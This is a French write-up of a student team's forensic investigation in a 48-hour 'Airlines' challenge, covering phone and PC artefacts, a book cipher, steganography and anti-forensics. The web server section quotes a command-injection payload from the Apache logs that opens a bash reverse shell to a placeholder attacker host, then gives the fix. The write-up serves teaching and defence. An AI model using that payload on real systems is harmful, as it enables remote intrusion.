# Challenge 48h — Investigation forensic « Airlines »

Write-up de l'investigation numérique menée en équipe de 5 pendant le Challenge 48h d'Ynov Campus Lille (mars 2026).

> Les flags et les données personnelles des profils fictifs du scénario sont masqués (`AIRLINES{…}`). Les images disques et extractions fournies par l'école ne sont pas publiées.

## Le scénario

Suspicion de fuite d'informations classifiées impliquant un agent de la sécurité intérieure. Trois suspects, leurs téléphones et leurs PC saisis. Objectifs :

- identifier les moyens de communication discrets du réseau ;
- comprendre la nature des données volées ;
- établir la chronologie des faits ;
- mettre en évidence les techniques de dissimulation et de destruction de preuves.

## Outils et méthode

| Support | Outils |
|---|---|
| Téléphones (extractions `.ufd`) | Cellebrite UFED / UFADE (vérification du moteur d'acquisition dans les métadonnées), Cellebrite Reader pour les bases SQLite des applis |
| PC (images `E01`, NTFS) | Autopsy, RegRipper pour les ruches du registre |
| Corrélation | Scripts PowerShell et requêtes SQLite3 |
| Serveur web (conteneur Linux) | Analyse des logs Apache (`access.log`) |

## Ce que l'analyse a établi

**Identification des suspects** — coordonnées des trois profils retrouvées dans les extractions téléphoniques et les fiches contacts exportées en XML ; le rôle de l'agent interne confirmé en filtrant ses historiques SQLite sur des mots-clés professionnels.

**Chronologie** — dates d'installation des trois PC tirées de l'attribut `$STANDARD_INFORMATION` de la MFT ; premier rendez-vous physique daté et localisé grâce aux métadonnées GPS (EXIF) d'une photo.

**Communication chiffrée** — les messages utilisaient un chiffrement par livre (*book cipher*) au format `page_ligne_mot`. Le livre commun a été retrouvé sur les trois PC ; en appliquant le chiffre au livre, on obtient le mot de passe utilisé pour la stéganographie.

**Compromission** — un fichier audio compromettant retrouvé dans la base Autopsy à partir d'un raccourci `.lnk` créé par l'activité récente de Windows, ce qui date la compromission.

**Anti-forensics**
- outil de stéganographie (OpenStego) identifié dans le profil utilisateur ;
- 3 fichiers chiffrés avec Picocrypt (`.pcv`) ;
- suppression d'un fichier chiffré retrouvée dans la corbeille, avec son horodatage UTC ;
- installation de malwares pour la persistance (timeline sur plusieurs semaines).

**Serveur web** — dans les logs Apache du conteneur, deux requêtes exploitent une injection de commande sur le paramètre `IP` de `insert.php` (`127.0.0.1; bash -i >& /dev/tcp/<attaquant>/4444 0>&1`) pour ouvrir un reverse shell. La page renvoie `200` : la commande est passée telle quelle au shell sans validation.

Correctif côté application : valider le paramètre comme une adresse IP stricte et ne jamais le concaténer dans une commande shell (appel du binaire avec une liste d'arguments, sans shell).

## Ce que j'en retiens

- Vérifier l'outil d'acquisition et l'intégrité des preuves avant toute conclusion.
- Les artefacts « involontaires » (MFT, `.lnk`, corbeille, EXIF) racontent souvent plus que les fichiers eux-mêmes.
- Corréler téléphones et PC avec des requêtes SQL fait gagner beaucoup de temps sur des milliers d'entrées.

## Équipe

Gabriel Favre, Léo Dupuy, Théo D'Amore, Kevin Bura, Florin Hamelin.
